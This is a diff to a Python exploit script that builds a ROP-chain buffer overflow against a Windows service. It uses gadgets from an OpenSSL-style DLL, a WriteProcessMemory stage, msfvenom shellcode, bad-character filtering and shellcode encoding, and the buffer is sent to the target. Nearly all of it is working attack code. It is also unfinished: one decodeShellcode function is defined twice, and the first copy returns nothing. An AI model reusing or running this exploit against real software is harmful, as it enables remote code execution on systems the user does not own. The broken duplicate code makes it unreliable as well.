@@ -216,21 +216,50 @@ recover knowledge
 
 """
 
-import argparse
-import socket
 import struct
 import sys
 from struct import pack
 
-from colorama import Back, Fore, Style, init
 from modules.msfvenom_module import generatePayload
-from modules.shellcode import getShellcode
+from modules.shellcode_module import getShellcode
 
-from utils.util import log, checkBadChars, checkNullBytes, sendMalBuff, parse_args, printBuffer, leakFunctionAddress, repeat_bytes
+from modules.util_module import bad_chars, log, checkBadChars, checkNullBytes, sendMalBuff, parse_args, printBuffer, leakFunctionAddress, repeat_bytes
 
 DEBUG = True
 DEBUG_Response = False
 BASE_ADDR_BAD = False
+
+
+def decodeShellcode(encodedShellcode, badCharsList):
+    # NOTE:: Unknown if ill keep this func here, ideally should be in utils or shellcode_module
+
+    # buffer to restore the original shellcode
+    restoreShellcode = b""
+
+    # Generate a list of good chars that are not 0x00 or any char in the badCharsList
+    goodChars = [i for i in range(256) if i not in badCharsList and i != 0x00]
+    log(f"Generated {len(goodChars)} good characters for encoding.", level="*", indent=1)
+
+    # Map each bad char to a unique good char
+    charMap = {bad: good for bad, good in zip(badCharsList, goodChars)}
+
+    # Iterate through the encoded shellcode and replace bad chars with their corresponding good chars
+    for byte in encodedShellcode:
+        if byte in charMap:
+            restoreShellcode += bytes([charMap[byte]])
+        else:
+            restoreShellcode += bytes([byte])
+
+    pass
+
+
+def decodeShellcode(encodedShellcode, bad_indexes, originalShellcode):
+    restored = bytearray(encodedShellcode)
+
+    for index in bad_indexes:
+        restored[index] = originalShellcode[index]
+
+    return bytes(restored)
 
 
 def main():
@@ -355,7 +384,15 @@ def main():
         #                         restarting the PC gave me a new base address and so now it works as expected
         # eip = pack("<L", (libeay32ibm019 + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
         eip = rop_push_esp_pop_esi_ret  # <- Save ESP to ESI
-        log(f"DEBUG: sent_eip: {hex(struct.unpack('<L', eip)[0])}", level="!!!")
+        log(f"DEBUG: sent_eip: 0x{struct.unpack('<L', eip)[0]:08x}", level="!!!")
+
+        if checkBadChars(eip):
+            log(f"eip: 0x{struct.unpack('<L', eip)[0]:08x} contains bad chars", level="-", indent=2)
+            sys.exit(1)
+
+        if not checkNullBytes(eip):
+            log(f"eip: 0x{struct.unpack('<L', eip)[0]:08x} contains null bytes", level="-", indent=2)
+            sys.exit(1)
         # eip += rop_int3_int3_int3_int3_ret  # <- Debugging
         # eip = pack("<L", (0x41424345))  # push esp; pop esi; ret <- Save ESP to ESI
 
@@ -430,6 +467,7 @@ def main():
         *************************** Stage 1d: Shellcode Decoding ***************************
         ************************************************************************************
         """
+        rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; ret
         rop += rop_pop_ecx_ret  # pop ecx ; ret
         rop += pack("<L", (0xFFFFFFFF))  # negative offset -1
         rop += rop_sub_eax_ecx_pop_ebx_ret  # sub eax, ecx; pop ebx; ret
@@ -452,7 +490,7 @@ def main():
 
         """
         ************************************************************************************
-        **************************** Stage 2: Shellcode Encoding ***************************
+        *********************** Stage 2: Shellcode loading (ENCODED) ***********************
         ************************************************************************************
         """
         # 0257_03242026:
@@ -461,11 +499,11 @@ def main():
         # REASON:: mfsvenom uses a Encoder/Decoder to avoid badchars. This requires the use of writeable memory
         #          which is not available in this case as WPM restores the default protections which were read/exec
         offset2Len = 0x600 - len(rop)
-        offset2 = repeat_bytes(
-            "OFFSET.SHELLCODE", offset2Len
-        )  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
+        offset2 = repeat_bytes("OFFSET.SHELLCODE", offset2Len)  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
         # shellcode = getShellcode(encoded=True)[:20]  # Get encoded shellcode, moving forward we will be using the encoded shellcode
         shellcode = rop_int3_int3_int3_int3_ret
+        encoded_shellcode, replacements = getShellcode(encoded=True)  # Get encoded shellcode, moving forward we will be using the encoded shellcode
+        shellcode += encoded_shellcode
         log("Encoded Shellcode", level="+")
         printBuffer(shellcode, width="db")
 
@@ -476,7 +514,7 @@ def main():
         # padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))
         # TEST CODE
         padding_len = 0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode)
-        padding = repeat_bytes("DEADC0DE", padding_len)
+        padding = repeat_bytes("DEADC0DE.PADDING", padding_len)
 
         # Prepare buffer + add checksum
         buffer = offset + wpm + eip + rop + offset2 + shellcode + padding
